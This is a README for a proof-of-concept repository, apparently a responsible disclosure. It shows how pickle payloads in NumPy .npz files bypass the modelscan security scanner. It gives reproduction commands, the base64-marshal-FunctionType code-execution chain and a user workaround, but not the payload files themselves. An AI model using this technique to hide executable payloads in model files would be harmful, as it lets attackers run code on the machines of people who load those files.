# modelscan NumPy .npz Bypass PoC

## Summary

Demonstrates two PoCs for `modelscan` (<= 0.8.5) detection bypass in NumPy .npz files:

1. **`malicious.npz`** — basic RCE via `os.system` in a pickle payload (still bypasses modelscan's NPZ scanner due to the file structure)
2. **`rce_bypass.npz`** — the full marshal+types+base64 chain (the documented bypass class)

## Affected

- modelscan <= 0.8.5
- numpy >= 1.10 (all versions using pickle for object arrays)
- `np.load(..., allow_pickle=True)` (the historical default)

## Reproduction

```bash
pip install modelscan numpy

# Basic PoC
modelscan scan -p malicious.npz   # reports "No issues" (BYPASS)
python -c "import numpy as np; np.load('malicious.npz', allow_pickle=True)"
cat pwned_p4.txt  # PWNED_P4

# Bypass variant
modelscan scan -p rce_bypass.npz   # reports "No issues" (BYPASS)
python -c "import numpy as np; np.load('rce_bypass.npz', allow_pickle=True)"
cat pwned_p4.txt  # PWNED_P4
```

## Attack Chain

The .npz format is a ZIP archive containing `.npy` files. NumPy uses pickle to deserialize object arrays (`<O` dtype) when `allow_pickle=True`. The pickle payload is:

1. `base64.b64decode(\"...\")` decodes pre-compiled bytecode
2. `marshal.loads(bytecode)` deserializes to code object
3. `types.FunctionType(code, {})` constructs a callable
4. `callable()` executes arbitrary code

None of these globals are in modelscan's `unsafe_globals` blacklist.

## Files

- `malicious.npz` — Basic PoC (~235 bytes)
- `rce_bypass.npz` — Full bypass PoC (~294 bytes)
- `gen_malicious_npz.py` — Generator script for basic PoC
- `README.md` — This file

## Workaround (for users)

Until a fix is released, set `allow_pickle=False` when calling `np.load()`:

```python
import numpy as np
arr = np.load('data.npz', allow_pickle=False)  # refuses object arrays
```

## Disclosure

- Discovered by: jasonmiao0511-hue
- Reported via: huntr.com Model Format Vulnerability Form
- Date: 2026-06-15
- Related: see also [modelscan-pickle-bypass-poc](https://github.com/jasonmiao0511-hue/modelscan-pickle-bypass-poc), [modelscan-joblib-bypass-poc](https://github.com/jasonmiao0511-hue/modelscan-joblib-bypass-poc), [modelscan-pytorch-bypass-poc](https://github.com/jasonmiao0511-hue/modelscan-pytorch-bypass-poc) for the same root cause in other formats
